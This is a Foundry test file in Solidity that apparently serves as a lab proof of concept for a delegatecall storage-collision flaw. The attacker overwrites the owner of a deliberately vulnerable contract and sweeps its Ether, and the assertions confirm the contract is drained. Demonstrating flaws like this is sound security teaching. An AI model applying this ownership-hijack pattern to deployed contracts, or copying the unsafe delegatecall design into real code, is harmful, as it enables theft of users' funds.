// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "../contracts/Vulnerable.sol";
import "../contracts/Attack.sol";

contract DelegatecallTest is Test {
    Vulnerable vulnerable;
    LogicContract logic;
    Attack attack;

    address payable attackerEOA = payable(address(0xA11CE));
    address payable treasury = payable(address(0xBEEF));

    function setUp() public {
        // Deployer is initially the owner
        vulnerable = new Vulnerable{value: 5 ether}();
        logic = new LogicContract();
        attack = new Attack();

        // Deposit some additional Ether that the attacker will later "sweep"
        vm.deal(treasury, 10 ether);
        vm.prank(treasury);
        (bool ok, ) = address(vulnerable).call{value: 3 ether}("");
        require(ok, "funding failed");
    }

    function testExploitDelegatecallOwnerHijack() public {
        // Sanity check: at the start, attacker is not the owner
        assertTrue(vulnerable.owner() != attackerEOA, "pre: attacker already owner?");

        // Attacker calls setVars with their malicious logic contract
        vm.prank(attackerEOA);
        vulnerable.setVars(address(attack), 123);

        // Now the owner in Vulnerable should be overwritten to attackerEOA
        assertEq(vulnerable.owner(), attackerEOA, "owner should be attacker after delegatecall");

        // Attacker can now withdraw the funds
        uint256 before = attackerEOA.balance;
        vm.prank(attackerEOA);
        vulnerable.sweep(attackerEOA);
        uint256 afterBal = attackerEOA.balance;

        assertGt(afterBal, before, "attacker should receive swept funds");
        assertEq(address(vulnerable).balance, 0, "vulnerable should be drained");
    }
}
